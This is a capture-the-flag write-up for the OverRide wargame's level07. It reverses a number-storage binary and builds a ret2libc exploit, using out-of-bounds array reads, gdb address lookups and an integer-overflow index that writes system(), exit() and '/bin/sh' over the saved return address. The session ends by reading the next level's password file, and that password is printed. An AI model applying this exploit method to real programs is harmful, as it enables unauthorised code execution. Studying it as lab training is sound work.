# Level07 `ret2libc`

```
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------
```

## Overview

The binary is a simple program that manages a storage with a loop menu, allowing users to `read` and `store` numbers in a static array.

The program takes a `buffer` of size **20** as input for the menu and chooses the option using `memcmp()`. Access to the array (for read or store) is not protected.

## Analysis
The first thing the program does is to clear every argument and environment variable.

### Input
There are two ways the program receives input:

#### Menu Input
This is how the program asks for a menu option input:

```C
fgets(s, 20, stdin);
s[strlen(s) - 1] = 0;
```
#### Numeric Input
This is how the program asks for numeric input:

```C
int get_unum()
{
  int n = 0;

  fflush(stdout);
  scanf("%u", &n);
  clear_stdin();
  return n;
}
```

### Store
Numbers are stored in a **static array** of size **400 bytes**.

```C
int array[400];
```

Indexes that are multiples of 3 are reserved and cannot be assigned:

```C
int store_number(int array)
{
    unsigned int unum;
    unsigned int index;

    printf(" Number: ");
    unum = get_unum();
    printf(" Index: ");
    index = get_unum();
    if ( index % 3 == 0) || unum  >> 0x18 == 0xb7 )
    {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
    else
    {
        *(int *)(array + 4 * index) = unum;
        return 0;
    }
}
```

### Read
To access the element `storage[i]`, the program reads `storage + 4 * i`, as each input number is stored in 4 bytes:

```C
int read_number(int array)
{
  int unum;

  printf(" Index: ");
  unum = get_unum();
  printf(" Number at data[%u] is %u\n", unum, *(int *)(array + 4 * unum));
  return 0;
}
```

## Mapping
We can read through the array with the `read_number()` function. The following script prints every non-zero value from the array and identifies some *stack addresses*:

```bash
for i in {0..700}
do
    O=$(echo -e "read\n$i\nquit" | ./level07)
    if [ $? -ne 0 ]; then
        break
    fi
    NL=$(echo "$O" | grep "Number")
    NB=$(echo "$NL" | awk '{print $NF}')
    if [ $NB -ne 0 ]; then
        echo "a[ $i ] -> $NB -> 0x$(echo "obase=16; $NB" | bc)"
    fi
done
```

<details>
<summary><b>Output</b></summary>

On a 32-bit system, memory addresses are usually within the range `0x00000000` to `0xFFFFFFFF`.

I've put an arrow `<===` on the numbers that appear to be addresses.

```bash
a[ 100 ] -> 1 -> 0x1
a[ 101 ] -> 1684104562 -> 0x64616572
a[ 106 ] -> 893490944 -> 0x35419700
a[ 107 ] -> 4160665120 -> 0xF7FEB620 <====
a[ 109 ] -> 134515209 -> 0x8048A09 <====
a[ 110 ] -> 4160548852 -> 0xF7FCEFF4 <====
a[ 114 ] -> 4158936339 -> 0xF7E45513 <====
a[ 115 ] -> 1 -> 0x1
a[ 116 ] -> 4294957012 -> 0xFFFFD7D4 <====
a[ 117 ] -> 4294957020 -> 0xFFFFD7DC <====
a[ 118 ] -> 4160565248 -> 0xF7FD3000 <====
a[ 120 ] -> 4294956828 -> 0xFFFFD71C <====
a[ 121 ] -> 4294957020 -> 0xFFFFD7DC <====
a[ 123 ] -> 134513336 -> 0x80482B8 <====
a[ 124 ] -> 4160548852 -> 0xF7FCEFF4 <====
a[ 128 ] -> 936830471 -> 0x37D6E607
a[ 129 ] -> 3640767269 -> 0xD901B325
a[ 133 ] -> 1 -> 0x1
a[ 134 ] -> 134513936 -> 0x8048510 <====
a[ 136 ] -> 4160686672 -> 0xF7FF0A50 <====
a[ 137 ] -> 4158936105 -> 0xF7E45429 <====
a[ 138 ] -> 4160737268 -> 0xF7FFCFF4 <====
a[ 139 ] -> 1 -> 0x1
a[ 140 ] -> 134513936 -> 0x8048510 <====
a[ 142 ] -> 134513969 -> 0x8048531 <====
a[ 143 ] -> 134514467 -> 0x8048723 <====
a[ 144 ] -> 1 -> 0x1
a[ 145 ] -> 4294957012 -> 0xFFFFD7D4 <====
a[ 146 ] -> 134515200 -> 0x8048A00 <====
a[ 147 ] -> 134515312 -> 0x8048A70 <====
a[ 148 ] -> 4160665120 -> 0xF7FEB620 <====
a[ 149 ] -> 4294957004 -> 0xFFFFD7CC <====
a[ 150 ] -> 4160739608 -> 0xF7FFD918 <====
a[ 151 ] -> 1 -> 0x1
a[ 152 ] -> 4294957306 -> 0xFFFFD8FA <====
a[ 154 ] -> 4294957316 -> 0xFFFFD904 <====
a[ 155 ] -> 4294957336 -> 0xFFFFD918 <====
a[ 156 ] -> 4294957352 -> 0xFFFFD928 <====
a[ 157 ] -> 4294957383 -> 0xFFFFD947 <====
a[ 158 ] -> 4294957402 -> 0xFFFFD95A <====
a[ 159 ] -> 4294957415 -> 0xFFFFD967 <====
a[ 160 ] -> 4294958728 -> 0xFFFFDE88 <====
a[ 161 ] -> 4294958751 -> 0xFFFFDE9F <====
a[ 162 ] -> 4294958828 -> 0xFFFFDEEC <====
a[ 163 ] -> 4294958852 -> 0xFFFFDF04 <====
a[ 164 ] -> 4294958869 -> 0xFFFFDF15 <====
a[ 165 ] -> 4294958877 -> 0xFFFFDF1D <====
a[ 166 ] -> 4294958902 -> 0xFFFFDF36 <====
a[ 167 ] -> 4294958920 -> 0xFFFFDF48 <====
a[ 168 ] -> 4294958936 -> 0xFFFFDF58 <====
a[ 169 ] -> 4294958981 -> 0xFFFFDF85 <====
a[ 170 ] -> 4294959013 -> 0xFFFFDFA5 <====
a[ 171 ] -> 4294959047 -> 0xFFFFDFC7 <====
a[ 172 ] -> 4294959059 -> 0xFFFFDFD3 <====
a[ 174 ] -> 32 -> 0x20
a[ 175 ] -> 4160599088 -> 0xF7FDB430 <====
a[ 176 ] -> 33 -> 0x21
a[ 177 ] -> 4160598016 -> 0xF7FDB000 <====
a[ 178 ] -> 16 -> 0x10
a[ 179 ] -> 126614525 -> 0x78BFBFD
a[ 180 ] -> 6 -> 0x6
a[ 181 ] -> 4096 -> 0x1000
a[ 182 ] -> 17 -> 0x11
a[ 183 ] -> 100 -> 0x64
a[ 184 ] -> 3 -> 0x3
a[ 185 ] -> 134512692 -> 0x8048034 <====
a[ 186 ] -> 4 -> 0x4
a[ 187 ] -> 32 -> 0x20
a[ 188 ] -> 5 -> 0x5
a[ 189 ] -> 9 -> 0x9
a[ 190 ] -> 7 -> 0x7
a[ 191 ] -> 4160602112 -> 0xF7FDC000 <====
a[ 192 ] -> 8 -> 0x8
a[ 194 ] -> 9 -> 0x9
a[ 195 ] -> 134513936 -> 0x8048510 <====
a[ 196 ] -> 11 -> 0xB
a[ 197 ] -> 1007 -> 0x3EF
a[ 198 ] -> 12 -> 0xC
a[ 199 ] -> 1008 -> 0x3F0
a[ 200 ] -> 13 -> 0xD
a[ 201 ] -> 1007 -> 0x3EF
a[ 202 ] -> 14 -> 0xE
a[ 203 ] -> 100 -> 0x64
a[ 204 ] -> 23 -> 0x17
a[ 205 ] -> 1 -> 0x1
a[ 206 ] -> 25 -> 0x19
a[ 207 ] -> 4294957275 -> 0xFFFFD8DB <====
a[ 208 ] -> 31 -> 0x1F
a[ 209 ] -> 4294959086 -> 0xFFFFDFEE <====
a[ 210 ] -> 15 -> 0xF
a[ 211 ] -> 4294957291 -> 0xFFFFD8EB <====
a[ 217 ] -> 905969664 -> 0x36000000
a[ 218 ] -> 1165886860 -> 0x457E058C
a[ 219 ] -> 991133054 -> 0x3B137D7E
a[ 220 ] -> 834228118 -> 0x31B94F96
a[ 221 ] -> 1766673842 -> 0x694D4DB2
a[ 222 ] -> 3553334 -> 0x363836
a[ 670 ] -> 791543808 -> 0x2F2E0000
a[ 671 ] -> 1702258028 -> 0x6576656C
a[ 672 ] -> 3616876 -> 0x37306C
```

</details>

## `EIP` outside of boundaries

We are looking for the saved `EIP` on the stack, when reading outside of the boundaries of the static array.

To find the saved `EIP` address on the `main` function, we use `gdb`.

```bash
(gdb) break *main
Breakpoint 1 at 0x8048723
(gdb) run
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048723 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x8048723 in main; saved eip 0xf7e45513 <=====
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd720
 Saved registers:
  eip at 0xffffd71c
```

And in fact, in the output of our *mapping script*, we find the address `0xf7e45513` on the index `114`.

```bash
a[ 100 ] -> 1 -> 0x1
a[ 101 ] -> 1684104562 -> 0x64616572
a[ 106 ] -> 893490944 -> 0x35419700
a[ 107 ] -> 4160665120 -> 0xF7FEB620
a[ 109 ] -> 134515209 -> 0x8048A09
a[ 110 ] -> 4160548852 -> 0xF7FCEFF4
a[ 114 ] -> 4158936339 -> 0xF7E45513 <====
a[ 115 ] -> 1 -> 0x1
a[ 116 ] -> 4294957012 -> 0xFFFFD7D4
a[ 117 ] -> 4294957020 -> 0xFFFFD7DC
a[ 118 ] -> 4160565248 -> 0xF7FD3000
a[ ... ] -> . -> ...
```

## Payload

A `ret2libc` (`return-to-libc`) attack is a technique where an attacker exploits a buffer overflow vulnerability to redirect the program's control flow to call functions from the `libc` library, such as `system()`, `execve()`, or `popen()`. This attack is effective when the stack is non-executable (`NX`), preventing direct execution of injected shellcode.

The basic formula for a `ret2libc` attack payload is:

```bash
[Address of system()]  +  
[Address of ‘ret‘ instruction within libc]  +  
[Address of argument ("/bin/sh" or command)]
```
We can construct the payload using the `system` function + the `/bin/sh` string, that typically resides within the `libc` library (`libc.so`).

### Search for `System` address

We find the `system` function address at `0xf7e6aed0`.

```bash
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

### Search for `exit` address

We find the `exit` function address at `0xf7e5eb70`.

```bash
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit
```

### Search for `/bin/sh` address

We can display the memory mappings of the current process, to list the memory regions allocated to the process, and search for the `libc` library mapped memory.

```bash
(gdb) break main
Breakpoint 1 at 0x8048729
(gdb) run
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) info proc map
process 19259
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

The start of the `libc` memory is at `0xf7e2c000` and the end is at `0xf7fd0000`, so we can search for the address of `/bin/sh` with this command:

```bash
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec
1 pattern found.
```

### Constructing the Payload

To do a `ret2libc` (`system` + `ret` + `arg`), we need to write these addresses in `EIP`, `EIP + 1`, and `EIP + 2`:

|   Value    |    Address    |   Decimal   |  Index  |
|:----------:|:-------------:|:-----------:|:-------:|
| `system()` | `0xf7e6aed0`  |  4159090384 |  114    |
| `system()` |     ...       |    ...      | `2147483762` |
| `exit()`   | `0xf7e5eb70`  |  4159040368 |  `115`  |
| `/bin/sh`  | `0xf7f897ec`  |  4160264172 |  `116`  |

But as `114` is a multiple of 3, we need to find the nearest `int` overflow: `114` + largest `32-bit` integer.

`114` + `2147483647` + `1` = **2147483762**

## Flag

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store 
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115	
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```